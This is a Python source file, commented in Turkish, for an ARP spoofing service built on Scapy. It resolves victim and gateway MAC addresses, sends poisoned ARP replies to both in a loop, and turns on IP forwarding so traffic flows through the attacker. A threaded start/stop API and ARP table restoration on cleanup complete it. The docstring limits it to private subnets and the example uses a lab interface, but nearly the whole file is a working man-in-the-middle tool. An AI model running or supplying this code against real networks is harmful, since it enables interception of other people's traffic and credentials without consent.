"""ARP Spoofing servisi — Scapy tabanlı çift yönlü MitM.

Kullanım:
    session = SpoofSession(job_id=..., interface="vboxnet0",
                           victim_ip="192.168.56.10", gateway_ip="192.168.56.1")
    spoofer = ArpSpoofer(log_callback=my_cb)
    spoofer.start(session, duration=120)
    # ... daha sonra:
    spoofer.stop(session.job_id)

Güvenlik notları:
  - Yalnızca private subnet'ler kabul edilmeli (routes katmanında doğrulanır).
  - IP forwarding otomatik açılır; cleanup'ta mutlaka kapatılır.
  - 5 kez restore paketi gönderilir → güvenilirlik artar.
  - Singleton _spoofer nesnesi tüm endpoint'ler tarafından paylaşılır.
"""

import logging
import threading
import time
from dataclasses import dataclass, field
from typing import Callable

logger = logging.getLogger(__name__)

try:
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf as _scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("scapy kurulu değil — MitM modülü devre dışı (pip install scapy)")


@dataclass
class SpoofSession:
    job_id:       str
    interface:    str
    victim_ip:    str
    gateway_ip:   str
    victim_mac:   str = ""
    gateway_mac:  str = ""
    attacker_mac: str = ""
    packets_sent: int = 0
    active:       bool = False
    logs:         list[str] = field(default_factory=list)


class ArpSpoofer:
    """Çift yönlü ARP poisoning + cleanup servisi."""

    INTERVAL     = 2      # ARP yenileme aralığı (saniye)
    MAX_DURATION = 600    # Maksimum oturum süresi (saniye)
    RESTORE_REPS = 5      # Restore paketi tekrar sayısı

    def __init__(self, log_callback: Callable[[str, str], None] | None = None):
        self._sessions: dict[str, SpoofSession]  = {}
        self._threads:  dict[str, threading.Thread] = {}
        self._log_cb = log_callback

    # ---------------------------------------------------------------- MAC çözme
    @staticmethod
    def get_mac(ip: str, interface: str, timeout: int = 3) -> str | None:
        """ARP isteğiyle IP → MAC çözümlemesi."""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=interface, timeout=timeout, verbose=False,
            )
            return ans[0][1].hwsrc if ans else None
        except Exception as e:
            logger.error("get_mac(%s) başarısız: %s", ip, e)
            return None

    # ----------------------------------------------------------- IP forwarding
    @staticmethod
    def _set_ip_forward(enable: bool) -> None:
        val = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as fh:
                fh.write(val)
        except PermissionError:
            import subprocess
            subprocess.run(
                ["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                check=True, capture_output=True,
            )

    # ----------------------------------------------------------- ARP paketleri
    @staticmethod
    def _poison(target_ip: str, target_mac: str, spoof_ip: str) -> Ether:
        """target'a: 'spoof_ip artık bende' diyen ARP reply."""
        return Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,
        )

    @staticmethod
    def _restore(
        target_ip: str, target_mac: str,
        real_src_ip: str, real_src_mac: str,
    ) -> Ether:
        """Gerçek MAC bilgisini target'a geri gönder."""
        return Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=real_src_ip, hwsrc=real_src_mac,
        )

    # ------------------------------------------------------------- spoof döngüsü
    def _spoof_loop(self, session: SpoofSession, duration: int) -> None:
        iface = session.interface
        _scapy_conf.verb = 0

        def log(msg: str) -> None:
            ts = time.strftime("%H:%M:%S")
            full = f"[{ts}] {msg}"
            session.logs.append(full)
            logger.info("[MitM %s] %s", session.job_id[:8], msg)
            if self._log_cb:
                try:
                    self._log_cb(session.job_id, full)
                except Exception:
                    pass

        # MAC çözümlemesi
        log(f"MAC çözümleniyor → kurban: {session.victim_ip}")
        session.victim_mac = self.get_mac(session.victim_ip, iface) or ""
        if not session.victim_mac:
            log(f"⚠ Kurban MAC alınamadı ({session.victim_ip}) — cihaz kapalı olabilir")
            session.active = False
            return

        log(f"MAC çözümleniyor → gateway: {session.gateway_ip}")
        session.gateway_mac = self.get_mac(session.gateway_ip, iface) or ""
        if not session.gateway_mac:
            log(f"⚠ Gateway MAC alınamadı ({session.gateway_ip})")
            session.active = False
            return

        session.attacker_mac = get_if_hwaddr(iface)
        log(f"✓ Kurban  : {session.victim_ip}  →  {session.victim_mac}")
        log(f"✓ Gateway : {session.gateway_ip}  →  {session.gateway_mac}")
        log(f"✓ Saldırgan MAC: {session.attacker_mac}")

        self._set_ip_forward(True)
        log("✓ IP forwarding etkinleştirildi")
        log(f"ARP poisoning başladı — süre: {duration}s  aralık: {self.INTERVAL}s")

        deadline      = time.time() + min(duration, self.MAX_DURATION)
        session.active = True

        try:
            while session.active and time.time() < deadline:
                pkt_v = self._poison(session.victim_ip,  session.victim_mac,  session.gateway_ip)
                pkt_g = self._poison(session.gateway_ip, session.gateway_mac, session.victim_ip)
                sendp([pkt_v, pkt_g], iface=iface, verbose=False)
                session.packets_sent += 2
                time.sleep(self.INTERVAL)
        finally:
            self._do_restore(session, iface, log)

    def _do_restore(self, session: SpoofSession, iface: str, log: Callable) -> None:
        log("ARP tabloları geri yükleniyor…")
        try:
            r_v = self._restore(
                session.victim_ip,  session.victim_mac,
                session.gateway_ip, session.gateway_mac,
            )
            r_g = self._restore(
                session.gateway_ip, session.gateway_mac,
                session.victim_ip,  session.victim_mac,
            )
            for _ in range(self.RESTORE_REPS):
                sendp([r_v, r_g], iface=iface, verbose=False)
                time.sleep(0.2)
            log("✓ ARP tabloları restore edildi")
        except Exception as exc:
            log(f"⚠ Restore hatası: {exc}")
        finally:
            try:
                self._set_ip_forward(False)
                log("✓ IP forwarding devre dışı bırakıldı")
            except Exception as exc:
                log(f"⚠ IP forwarding kapatılamadı: {exc}")
            session.active = False

    # ----------------------------------------------------------- public API
    def start(self, session: SpoofSession, duration: int = 120) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError(
                "Scapy kurulu değil. Kurmak için: pip install scapy"
            )
        t = threading.Thread(
            target=self._spoof_loop,
            args=(session, duration),
            daemon=True,
            name=f"arp-spoof-{session.job_id[:8]}",
        )
        self._sessions[session.job_id] = session
        self._threads[session.job_id]  = t
        t.start()

    def stop(self, job_id: str) -> None:
        """Döngüyü kır — finally bloğu cleanup'ı garanti eder."""
        session = self._sessions.get(job_id)
        if session:
            session.active = False

    def get_session(self, job_id: str) -> SpoofSession | None:
        return self._sessions.get(job_id)

    def get_thread(self, job_id: str) -> threading.Thread | None:
        return self._threads.get(job_id)


# ---- Singleton: job_manager ve endpoint'ler bu nesneyi paylaşır ----
_spoofer = ArpSpoofer()
